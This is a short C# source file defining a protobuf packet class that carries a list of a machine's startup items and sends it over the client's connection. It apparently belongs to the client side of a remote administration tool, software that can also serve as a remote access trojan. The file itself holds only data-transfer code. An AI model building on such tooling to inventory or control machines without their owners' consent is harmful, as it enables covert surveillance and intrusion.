﻿using System.Collections.Generic;
using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class GetStartupItemsResponse : IPacket
    {
        [ProtoMember(1)]
        public List<string> StartupItems { get; set; }

        public GetStartupItemsResponse()
        {
        }

        public GetStartupItemsResponse(List<string> startupitems)
        {
            this.StartupItems = startupitems;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}